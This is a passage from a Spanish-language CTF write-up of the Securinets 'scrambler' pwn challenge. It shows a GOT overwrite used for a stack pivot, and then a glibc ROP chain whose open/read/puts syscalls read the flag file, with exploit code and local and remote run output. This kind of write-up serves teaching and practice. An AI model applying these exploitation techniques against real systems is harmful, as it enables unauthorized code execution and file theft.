visualizar la GOT en GDB:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>gdb</span> -q <span class=mtku>scrambler_patched</span>
Reading symbols from <span class=code-dark-green>scrambler_patched</span>...
(No debugging symbols found in <span class=code-dark-green>scrambler_patched</span>)  
<span class=code-red>gef➤</span>  start
<span class=code-blue>[+]</span> Breaking at entry-point: 0x401190
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>  got

GOT protection: Partial RelRO | GOT functions: 11

[0x404018] <span class=code-dark-yellow>seccomp_init  →  0x401030</span>
[0x404020] <span class=code-dark-yellow>seccomp_rule_add  →  0x401040</span>
[0x404028] <span class=code-dark-yellow>puts@GLIBC_2.2.5  →  0x401050</span>
[0x404030] <span class=code-dark-yellow>seccomp_load  →  0x401060</span>
[0x404038] <span class=code-dark-yellow>__stack_chk_fail@GLIBC_2.4  →  0x401070</span>  
[0x404040] <span class=code-dark-yellow>printf@GLIBC_2.2.5  →  0x401080</span>
[0x404048] <span class=code-dark-yellow>srand@GLIBC_2.2.5  →  0x401090</span>
[0x404050] <span class=code-dark-yellow>time@GLIBC_2.2.5  →  0x4010a0</span>
[0x404058] <span class=code-dark-yellow>setvbuf@GLIBC_2.2.5  →  0x4010b0</span>
[0x404060] <span class=code-dark-yellow>__isoc99_scanf@GLIBC_2.7  →  0x4010c0</span>
[0x404068] <span class=code-dark-yellow>rand@GLIBC_2.2.5  →  0x4010d0</span>
</code></pre></div><p>Los valores anteriores son las entradas de la GOT cuando arranca el programa. Ninguna de las funciones está resuelta porque no se han llamado aún. Vamos a poner un <em>breakpoint</em> antes de cerrar el programa y así vemos cómo está la GOT:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>  break *0x401555
Breakpoint 1 at <span class=code-dark-blue>0x401555</span>
<span class=code-green>gef➤</span>  run
Starting program: ./scrambler_patched
1) Try scrambling
2) Quit
&gt; 2
Good bye!

Breakpoint 1, <span class=code-dark-blue>0x0000000000401555</span> in <span class=code-dark-yellow>??</span> ()  
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>  got

GOT protection: Partial RelRO | GOT functions: 11

[0x404018] <span class=code-dark-green>seccomp_init  →  0x7ffff7f94780</span>
[0x404020] <span class=code-dark-green>seccomp_rule_add  →  0x7ffff7f94e50</span>
[0x404028] <span class=code-dark-green>puts@GLIBC_2.2.5  →  0x7ffff7e24450</span>
[0x404030] <span class=code-dark-green>seccomp_load  →  0x7ffff7f94a90</span>
[0x404038] <span class=code-dark-yellow>__stack_chk_fail@GLIBC_2.4  →  0x401070</span>
[0x404040] <span class=code-dark-green>printf@GLIBC_2.2.5  →  0x7ffff7e01cc0</span>
[0x404048] <span class=code-dark-yellow>srand@GLIBC_2.2.5  →  0x401090</span>
[0x404050] <span class=code-dark-yellow>time@GLIBC_2.2.5  →  0x4010a0</span>
[0x404058] <span class=code-dark-green>setvbuf@GLIBC_2.2.5  →  0x7ffff7e24d10</span>
[0x404060] <span class=code-dark-green>__isoc99_scanf@GLIBC_2.7  →  0x7ffff7e030e0</span>  
[0x404068] <span class=code-dark-yellow>rand@GLIBC_2.2.5  →  0x4010d0</span>
</code></pre></div><p>Las entradas que aparecen en verde ya están resueltas. Y las que aparecen en amarillo no están resueltas porque no han sido llamadas en este punto de ejecución del programa.</p><p>Inicialmente, modifique la entrada de <code>__stack_chk_fail</code> por la entrada de <code>rand</code>. Entonces, solo tuve que modificar un byte (es decir, cambiar <code>0x70</code> por <code>0xd0</code>).</p><p>De nuevo, tenemso que calcular el <em>offset</em> a esta dirección. Esta vez es más fácil porque sabemos que <code>$rbp = 0x404200</code>. Por tanto, el <em>offset</em> para llegar a <code>0x404038</code> (entrada de <code>__stack_chk_fail</code> en la GOT) será <code>-0x200 + 0x38 + 0x20</code> (recordemos que la direcci´no base de la primitiva &ldquo;<em>write-what-where</em>&rdquo; ess <code>$rbp - 0x20</code>). Entonces, tenemos esta línea de código:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>    <span class=mtk8>write_what_where</span><span class=mtk1>(</span><span class=mtk1>p</span><span class=mtk1>,</span> <span class="mtk7 mtki">0x</span><span class=mtk6>d0</span><span class=mtk1>,</span> <span class=mtk5>-</span><span class="mtk7 mtki">0x</span><span class=mtk6>200</span> <span class=mtk5>+</span> <span class="mtk7 mtki">0x</span><span class=mtk6>38</span> <span class=mtk5>+</span> <span class="mtk7 mtki">0x</span><span class=mtk6>20</span><span class=mtk1>)</span>  
</code></pre></div><p>En este punto, comencé a probar la segunda ROP <em>chain</em>. Pero&mldr; Tampoco funcionaba porque <code>$rsp</code> seguía apuntando a direcciones de la pila (<em>stack</em>), por lo que no era capaz de modificar la dirección de retorno (que se almacena en la pila), ya que <code>$rbp</code> apunta a una dirección del binario (no hay <em>offsets</em> fijos entre los espacios de memoria de la pila, el binario o Glibc).</p><p>De nuevo, otro problema. Para solucionarlo, como <code>$rbp</code> está forzado a tener una dirección válida y la única que podemos poner es una dirección del binario, tenemos que cambiar <code>$rsp</code> también. Esta técnica se conoce como <em>Stack Pivot</em>, y consiste en mover el puntero de pila a un espacio de direcciones controlado.</p><p>Para poder realizar el <em>Stack Pivot</em>, necesitamos un <em>gadget</em> como <code>leave; ret</code>, que es equivalente a <code>mov rsp, rbp; pop rbp; ret</code>. Por suerte, este <em>gadget</em> está en el binario:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>ROPgadget</span> --binary <span class=mtku>scrambler</span> | <span class=code-dark-green>grep</span> <span class=code-dark-yellow>': leave ; ret$'</span>  
0x0000000000401387 <span class=code-red>: leave ; ret</span>
</code></pre></div><p>Y por tanto, en lugar de falsificar <code>__stack_chk_fail</code> para que sea <code>rand</code>, podemos falsificarla para que contenga la dirección del <em>gadget</em> <code>leave; ret</code> y realizar el <em>Stack Pivot</em>. Para ello, tenemos que modificar dos bytes: <code>0x70</code> pasará a ser <code>0x87</code> y <code>0x10</code> será <code>0x13</code>, que se realiza con estas líneas de código (que reemplazan a la anterior):</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>    <span class=mtk8>write_what_where</span><span class=mtk1>(</span><span class=mtk1>p</span><span class=mtk1>,</span> <span class="mtk7 mtki">0x</span><span class=mtk6>87</span><span class=mtk1>,</span> <span class=mtk5>-</span><span class="mtk7 mtki">0x</span><span class=mtk6>200</span> <span class=mtk5>+</span> <span class="mtk7 mtki">0x</span><span class=mtk6>38</span> <span class=mtk5>+</span> <span class="mtk7 mtki">0x</span><span class=mtk6>20</span><span class=mtk1>)</span>
    <span class=mtk8>write_what_where</span><span class=mtk1>(</span><span class=mtk1>p</span><span class=mtk1>,</span> <span class="mtk7 mtki">0x</span><span class=mtk6>13</span><span class=mtk1>,</span> <span class=mtk5>-</span><span class="mtk7 mtki">0x</span><span class=mtk6>200</span> <span class=mtk5>+</span> <span class="mtk7 mtki">0x</span><span class=mtk6>38</span> <span class=mtk5>+</span> <span class="mtk7 mtki">0x</span><span class=mtk6>20</span> <span class=mtk5>+</span> <span class=mtk6>1</span><span class=mtk1>)</span>  
</code></pre></div><p>Sorprendentemente, todo funciona como esperábamos. Ahora tenemos un proceso interactivo y la dirección de retorno se tomará de la nueva pila, que está entre las direcciones del binario. Ahora hay que realizar el truco para conseguir intentos de &ldquo;<em>scrambles</em>&rdquo; ilimitados otra vez. Y entonces, es momento de realizar la segunda ROP <em>chain</em>.</p><p>Esta ROP <em>chain</em> es algo compleja, por lo que la dividiré en partes:</p><ol><li>Escribir <code>"/home/ctf/flag.txt"</code> en una dirección conocida</li><li>Abrir el archivo de la <em>flag</em></li><li>Leer el archivo de la <em>flag</em> y guardar el contenido en una dirección conocida</li><li>Mostrar el contenido del archivo de la <em>flag</em></li></ol><p>Como hemos fugado Glibc, ahora tenemos acceso a un montón de <em>gadgets</em> y funciones útiles. Los <em>gadgets</em> se pueden obtener con <code>ROPgadget</code> en el archivo <code>libc.so_1.6</code>. Estos son los <em>gadgets</em> que vamos a necesitar (aparte de <code>pop rdi; ret</code>):</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>    <span class=mtk1>mov_qword_ptr_rax_rdi_ret</span> <span class=mtk5>=</span> <span class=mtk1>glibc</span><span class=mtk1>.</span><span class=mtk1>address</span> <span class=mtk5>+</span> <span class="mtk7 mtki">0x</span><span class=mtk6>09a0ff</span>  
    <span class=mtk1>pop_rax_ret</span>               <span class=mtk5>=</span> <span class=mtk1>glibc</span><span class=mtk1>.</span><span class=mtk1>address</span> <span class=mtk5>+</span> <span class="mtk7 mtki">0x</span><span class=mtk6>047400</span>
    <span class=mtk1>pop_rsi_ret</span>               <span class=mtk5>=</span> <span class=mtk1>glibc</span><span class=mtk1>.</span><span class=mtk1>address</span> <span class=mtk5>+</span> <span class="mtk7 mtki">0x</span><span class=mtk6>02604f</span>
    <span class=mtk1>pop_rdx_pop_r12_ret</span>       <span class=mtk5>=</span> <span class=mtk1>glibc</span><span class=mtk1>.</span><span class=mtk1>address</span> <span class=mtk5>+</span> <span class="mtk7 mtki">0x</span><span class=mtk6>119241</span>
    <span class=mtk1>pop_rcx_pop_rbx_ret</span>       <span class=mtk5>=</span> <span class=mtk1>glibc</span><span class=mtk1>.</span><span class=mtk1>address</span> <span class=mtk5>+</span> <span class="mtk7 mtki">0x</span><span class=mtk6>1025ae</span>
</code></pre></div><p>Para la primera parte, usaré este <em>payload</em> en bucle:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>    <span class=mtk1>flag</span> <span class=mtk5>=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'/home/ctf/flag.txt'</span>
    <span class=mtk1>flag</span> <span class=mtk5>=</span> <span class=mtk1>flag</span><span class=mtk1>.</span><span class=mtk8>ljust</span><span class=mtk1>(</span><span class=mtk8>len</span><span class=mtk1>(</span><span class=mtk1>flag</span><span class=mtk1>)</span> <span class=mtk5>+</span> <span class=mtk1>(</span><span class=mtk6>8</span> <span class=mtk5>-</span> <span class=mtk8>len</span><span class=mtk1>(</span><span class=mtk1>flag</span><span class=mtk1>)</span> <span class=mtk5>%</span> <span class=mtk6>8</span><span class=mtk1>),</span> <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\0</span><span class=mtk4>'</span><span class=mtk1>)</span>  
    <span class=mtk1>writable_addr</span> <span class=mtk5>=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>404000</span>

    <span class=mtk1>payload</span> <span class=mtk5>=</span> <span class="mtk7 mtki">b</span><span class=mtk4>''</span>

    <span class=mtk3>#</span> <span class=mtk3>Store</span> <span class=mtk3>"/home/ctf/flag.txt"</span> <span class=mtk3>in</span> <span class=mtk3>writable_addr</span>
    <span class=mtk5>for</span> <span class=mtk1>i</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk6>0</span><span class=mtk1>,</span> <span class=mtk8>len</span><span class=mtk1>(</span><span class=mtk1>flag</span><span class=mtk1>),</span> <span class=mtk6>8</span><span class=mtk1>):</span>
        <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>pop_rdi_ret</span><span class=mtk1>)</span>
        <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>flag</span><span class=mtk1>[</span><span class=mtk1>i</span><span class=mtk1>:</span><span class=mtk1>i</span> <span class=mtk5>+</span> <span class=mtk6>8</span><span class=mtk1>]</span>
        <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>pop_rax_ret</span><span class=mtk1>)</span>
        <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>writable_addr</span> <span class=mtk5>+</span> <span class=mtk1>i</span><span class=mtk1>)</span>
        <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>mov_qword_ptr_rax_rdi_ret</span><span class=mtk1>)</span>
</code></pre></div><p>La cadena de texto que contiene el nombre de archivo de la <em>flag</em> se rellena con bytes nulos hasta que tenga una longitud divisible entre <code>8</code>. Luego, vamos a almacenar la cadena en trozos de <code>8</code> bytes en una dirección escribible (por ejemplo, <code>0x404000</code>). El proceso utiliza <code>mov qword ptr [rax], rdi; ret</code> para guardar el contenido de <code>$rdi</code> en la dirección a la que apunta <code>$rax</code>. GDB puede ser útil para seguir la ejecución de la ROP <em>chain</em> y asegurar que el texto se guarda correctamente.</p><p>Después, tenemos que llamar a <code>open("/home/ctf/flag.txt", O_RDONLY)</code>. Nótese que <code>O_RDONLY</code> es un alias del valor <code>0</code> y que sabemos la dirección donde está guardada la cadena de texto con el nombre del archivo.</p><p>Primeramente, utilicé directamente la función <code>open</code> de Glibc, pero las reglas <code>seccomp</code> me bloqueaban el proceso. A lo mejor la función utiliza más llamadas de sistema. Luego, miré por <em>gadgets</em> con <code>syscall</code>: el binario no tiene ninguna y Glibc tiene muchas, pero ninguna termina en <code>ret</code>, por lo que no las podemos usar en una ROP <em>chain</em>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>ROPgadget</span> --binary <span class=mtku>scrambler</span> | <span class=code-dark-green>grep</span> syscall

<span class=code-cyan>$</span> <span class=code-dark-green>ROPgadget</span> --binary <span class=mtku>libc.so_1.6</span> | <span class=code-dark-green>grep</span> syscall | <span class=code-dark-green>wc</span> -c
153930

<span class=code-cyan>$</span> <span class=code-dark-green>ROPgadget</span> --binary <span class=mtku>libc.so_1.6</span> | <span class=code-dark-green>grep</span> syscall | <span class=code-dark-green>grep</span> ret$  
</code></pre></div><p>De nuevo, otro punto muerto&mldr; Pero luego me di cuenta de que Glibc tiene una función que se llama precisamente <code>syscall</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>readelf</span> -s <span class=mtku>libc.so_1.6</span> | <span class=code-dark-green>grep</span> syscall
  1980: 0000000000118750    55 FUNC    GLOBAL DEFAULT   15 <span class=code-red>syscall</span>@@GLIBC_2.2.5  
</code></pre></div><p>A lo mejor podemos usar esta función en la ROP <em>chain</em>, eso resolvería el problema. Una cosa a tener en cuenta es que los valores de los registros al ejecutar <code>syscall</code> (<code>$rax</code>, <code>$rdi</code>, <code>$rsi</code>, <code>$rdx</code>, <code>$rcx</code>&mldr;) se pasan a la función <code>syscall</code> como argumentos, por lo que <code>$rdi</code> = <code>$rax</code>, <code>$rsi</code> = <code>$rdi</code>, <code>$rdx</code> = <code>$rsi</code>, <code>$rcx</code> = <code>$rdx</code>&mldr; Esto puede ser un poco confuso, y por eso añadí comentarios en el código:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>    <span class=mtk3>#</span> <span class=mtk3>syscall:</span> <span class=mtk3>open("/home/ctf/flag.txt",</span> <span class=mtk3>0)</span>
    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>pop_rdi_ret</span><span class=mtk1>)</span>
    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk6>2</span><span class=mtk1>)</span>                         <span class=mtk3>#</span> <span class=mtk3>rdi</span> <span class=mtk3>(rax)</span>  
    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>pop_rsi_ret</span><span class=mtk1>)</span>
    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>writable_addr</span><span class=mtk1>)</span>             <span class=mtk3>#</span> <span class=mtk3>rsi</span> <span class=mtk3>(rdi)</span>
    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>pop_rdx_pop_r12_ret</span><span class=mtk1>)</span>
    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk6>0</span><span class=mtk1>)</span>                         <span class=mtk3>#</span> <span class=mtk3>rdx</span> <span class=mtk3>(rsi)</span>
    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk6>0</span><span class=mtk1>)</span>
    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>syscall</span><span class=mtk1>)</span>
</code></pre></div><p>La instrucción <code>sys_open</code> se ejecuta cuando <code>$rax = 2</code>. Luego, tenemos que usar <code>sys_read</code> (<code>$rax = 0</code>). El descriptor de archivo será <code>3</code> (porque <code>0</code>, <code>1</code> y <code>2</code> está reservados para <code>stdin</code>, <code>stdout</code> y <code>stderr</code>). Aún así, se puece mirar el número del descriptor de archivo al ejecutar <code>sys_open</code>, el descriptor de archivo resultante se devuelve en <code>$rax</code> (y es <code>3</code>). Con esto, esta es la ROP <em>chain</em> para <code>sys_read</code>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>    <span class=mtk3>#</span> <span class=mtk3>syscall:</span> <span class=mtk3>read(3,</span> <span class=mtk3>writable_addr,</span> <span class=mtk3>0x100)</span>
    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>pop_rdi_ret</span><span class=mtk1>)</span>
    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk6>0</span><span class=mtk1>)</span>                         <span class=mtk3>#</span> <span class=mtk3>rdi</span> <span class=mtk3>(rax)</span>  
    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>pop_rsi_ret</span><span class=mtk1>)</span>
    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk6>3</span><span class=mtk1>)</span>                         <span class=mtk3>#</span> <span class=mtk3>rsi</span> <span class=mtk3>(rdi)</span>
    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>pop_rdx_pop_r12_ret</span><span class=mtk1>)</span>
    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>writable_addr</span><span class=mtk1>)</span>             <span class=mtk3>#</span> <span class=mtk3>rdx</span> <span class=mtk3>(rsi)</span>
    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk6>0</span><span class=mtk1>)</span>
    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>pop_rcx_pop_rbx_ret</span><span class=mtk1>)</span>
    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class="mtk7 mtki">0x</span><span class=mtk6>100</span><span class=mtk1>)</span>                     <span class=mtk3>#</span> <span class=mtk3>rcx</span> <span class=mtk3>(rdx)</span>
    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk6>0</span><span class=mtk1>)</span>
    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>syscall</span><span class=mtk1>)</span>
</code></pre></div><p>El número <code>0x100</code> es solo para especificar la cantidad de bytes a leer del descriptor de archivo (presumiblemente, no necesitaremos tantos).</p><p>Finalmente, para imprimir la <em>flag</em> por pantalla, podríamos haber usado <code>sys_write</code> (siguiendo el procedimiento de ROP <em>chain</em> con <code>syscall</code>), pero creo que es más sencillo usar <code>puts</code>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>    <span class=mtk3># puts(writable_addr)</span>
    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>pop_rdi_ret</span><span class=mtk1>)</span>
    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>writable_addr</span><span class=mtk1>)</span>
    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>glibc</span><span class=mtk1>.</span><span class=mtk1>sym</span><span class=mtk1>.puts)</span>  
</code></pre></div><p>Y esto es todo. Ahora solo tenemos que usar la primitiva &ldquo;<em>write-what-where</em>&rdquo; de la misma manera que la usamos en la primera ROP <em>chain</em> y ejecutarla con la opción <code>2</code>.</p><p>Vamos a probar en local:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>echo</span> <span class=code-dark-yellow>'flag{this_is_the_flag!!}'</span> &gt; /home/ctf/flag.txt

<span class=code-cyan>$</span> <span class=code-dark-green>python3</span> <span class=mtku>solve.py</span>
[<span class=code-blue>*</span>] './scrambler_patched'
    Arch:     amd64-64-little
    RELRO:    <span class=code-dark-yellow>Partial RELRO</span>
    Stack:    <span class=code-dark-green>Canary found</span>
    NX:       <span class=code-dark-green>NX enabled</span>
    PIE:      <span class=code-dark-red>No PIE (0x3ff000)</span>
    RUNPATH:  <span class=code-dark-red>b'.'</span>
[<span class=code-green>+</span>] Starting local process './scrambler_patched': pid 447414  
[<span class=code-blue>*</span>] Leaked puts() address: 0x7f028c526450
[<span class=code-blue>*</span>] Glibc base address: 0x7f028c4a2000
[<span class=code-blue>*</span>] Switching to interactive mode
Good bye!
flag{this_is_the_flag!!}
gi\x8c\x7f
[<span class=code-blue>*</span>] Got EOF while reading in interactive
<span class=code-red>$</span>
</code></pre></div><p>¡¡Funciona!! Vamos a ver en remoto (puede tomar algo de tiempo en terminar, alrededor de 10 minutos):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> <span class=mtku>solve.py</span> 20.203.124.220 1235
[<span class=code-blue>*</span>] './scrambler_patched'
    Arch:     amd64-64-little
    RELRO:    <span class=code-dark-yellow>Partial RELRO</span>
    Stack:    <span class=code-dark-green>Canary found</span>
    NX:       <span class=code-dark-green>NX enabled</span>
    PIE:      <span class=code-dark-red>No PIE (0x3ff000)</span>
    RUNPATH:  <span class=code-dark-red>b'.'</span>
[<span class=code-green>+</span>] Opening connection to 20.203.124.220 on port 1235: Done  
[<span class=code-blue>*</span>] Leaked puts() address: 0x7f3c9865e450
[<span class=code-blue>*</span>] Glibc base address: 0x7f3c985da000
[<span class=code-blue>*</span>] Switching to interactive mode
Good bye!
Securinets{f8ee583021b816b1b557987ca120991a}
\x7f
[<span class=code-blue>*</span>] Got EOF while reading in interactive
<span class=code-red>$</span>
</code></pre></div><p>El <em>exploit</em> completo se puede encontrar aquí: <a href=https://github.com/7Rocky/CTF-scripts/blob/main/Securinets/scrambler/solve.py><code>solve.py</code></a>.</p><div class="mt6 instapaper_ignoref"></div></div></article></main><footer class="bg-black bottom-0 w-100 pa3" role=contentinfo><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href=https://7rocky.github.io/ title=https://7rocky.github.io/>&copy; 7Rocky 2022</a><div style=margin-top:8px><div><div><a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel=noopener aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></footer></body></html>